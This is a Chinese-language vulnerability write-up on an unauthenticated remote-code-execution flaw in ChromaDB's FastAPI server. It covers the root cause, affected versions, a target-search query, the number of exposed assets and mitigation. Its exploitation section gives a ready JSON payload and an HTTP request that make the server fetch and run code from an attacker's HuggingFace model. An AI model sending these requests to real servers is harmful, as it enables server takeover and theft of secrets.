---
cve: "CVE-2026-45829"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  CVSS 10.0 【严重】CVE-2026-45829 ChromaDB 爆出未授权 RCE：ChromaToast 横扫 AI 基础设施  
原创 chicken
                    chicken  爱坤sec   2026-05-22 18:30  
  
# 一 漏洞描述  
  
ChromaDB 开源向量数据库 Python FastAPI 服务器存在严重设计缺陷——**未授权攻击者可在鉴权之前触发 HuggingFace 模型加载并执行任意代码**。该漏洞由 HiddenLayer 发现并命名为 ChromaToast，获得 CVSS 10.0 满分评分。利用无需任何凭据，仅需向 `/api/v2/tenants/{tenant}/databases/{db}/collections` 端点发送特制请求，即可完全接管服务器，窃取 API 密钥、环境变量及磁盘文件。  
  
CVSS 评分 10.0  
# 二 影响版本  
```
Chromadb >= 1.0.0 （截至最新版 1.5.8 仍未修复）
```  
  
# 三 搜索语法  
```
app="Chroma-ChromaDB"
```  
  
  
四 影响范围  
  
资产大约4500个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uqtLGQlJSxXXI2r8J2P1LVsVvib4n1ssyBn7hIo9cicH6Qrn3h9s0EaSferGKIEq4oaDMiafLVaf9RIAUe9ibBMQmibWicNg5wgk5cnGR22A4C7icI/640?wx_fmt=png&from=appmsg "")  
  
五 漏洞利用  
```
**【根因】** 两个独立缺陷叠加：
1. 服务器无条件信任客户端提交的模型标识符（`model_name`），未做任何校验
2. 模型加载在**鉴权之前**执行，鉴权检查形同虚设
**【调用链】** `POST /api/v2/tenants/{tenant}/databases/{db}/collections` → 解析请求体中的 `kwargs` → 提取 `model_name` + `trust_remote_code: true` → 调用 `AutoModel.from_pretrained()` → 从 HuggingFace 下载恶意模型 → **执行远程代码** → 返回 HTTP 500（已无意义）
```python
# 核心攻击载荷
{
  "name": "exploit_collection",
  "metadata": {},
  "configuration": {
    "embedding_function": "HuggingFaceEmbeddingFunction",
    "model_name": "attacker/malicious-model",
    "kwargs": {
      "trust_remote_code": true
    }
  }
}
```
服务端处理流程：**接受请求 → 下载模型 → 执行代码 → 鉴权检查 → 拒绝请求**。攻击者已在第 3 步获得 Shell。
**【EXP 存放位置】** 服务器本地目录 `/opt/aikunsec/CVE-2026-45829/exploit.py`
```
POST /api/v2/tenants/default_tenant/databases/default_database/collections HTTP/1.1
Host: target:8000
Content-Type: application/json
{
  "name": "pwn",
  "configuration": {
    "embedding_function": "HuggingFaceEmbeddingFunction",
    "model_name": "your-hf-username/pwn-model",
    "kwargs": {"trust_remote_code": true}
  }
}
```
HiddenLayer 于 2026 年 2 月 17 日向 ChromaDB 报告，独立研究员 Azraelxuemo 更早在 2025 年 11 月报告，均未获回应。截至 ChromaDB 1.5.8 **仍未修复**。
```  
  
临时缓解：限制网络访问、禁止暴露 Python FastAPI 端口到公网、使用 Rust 前端替代。  
  
【严重声明】本文所涉及的工具、思路和操作手法仅用于本地安全测试以及教育目的，禁止将其用于非法入侵或对他人的系统进行攻击以及盈利，一切后果由操作者自行承担！！！下载后的24小时请删除。  
  
更多精彩文章与工具分享 欢迎关注  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
